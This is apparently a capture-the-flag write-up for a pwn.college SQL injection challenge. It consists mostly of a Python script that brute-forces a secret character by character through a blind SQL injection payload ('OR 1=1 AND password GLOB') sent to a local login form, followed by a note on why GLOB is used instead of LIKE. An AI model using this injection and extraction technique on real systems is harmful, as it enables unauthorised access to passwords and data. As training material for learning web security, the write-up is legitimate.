# SQLi 5

Python script:

```python
import requests

url = "http://challenge.localhost/"
username = "admin"
password = "' OR 1=1 AND password GLOB 'pwn.college{"

while True:
    for i in range(33,127):
        if chr(i) in ["*", "?"]:
            continue
        tmp = password + chr(i)
        data = {"username": username, "password": tmp+"*"}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            password = tmp
            print(f"Found: {password}")
            if chr(i) == "}":
                exit(0)
            break
```

Using `GLOB` because `LIKE` is, by default, case-insensitive in SQLite.
